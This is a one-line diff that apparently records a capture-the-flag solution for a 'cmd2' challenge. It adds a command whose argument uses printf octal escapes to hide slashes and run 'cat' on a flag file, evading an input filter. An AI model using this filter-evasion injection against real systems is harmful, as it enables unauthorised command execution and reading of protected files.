@@ -1,0 +1,1 @@
+./cmd2 "\$(printf '\057bin\057cat \057home\057cmd2\057f*')"
